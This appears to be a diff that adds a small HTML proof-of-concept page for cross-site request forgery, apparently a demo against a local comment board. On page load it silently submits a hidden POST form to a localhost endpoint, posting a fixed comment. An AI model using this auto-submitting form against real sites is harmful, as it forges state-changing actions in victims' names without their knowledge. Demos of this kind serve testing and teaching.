@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Proof of Concept</title>
+</head>
+<body onload="document.forms[0].submit()">
+  <h2>CSRF Demo - Auto-submitting state-changing POST to comment board...</h2>
+  <form action="http://localhost:8080/comments" method="POST">
+    <input type="hidden" name="body" value="CSRF posted this comment">
+  </form>
+</body>
+</html>
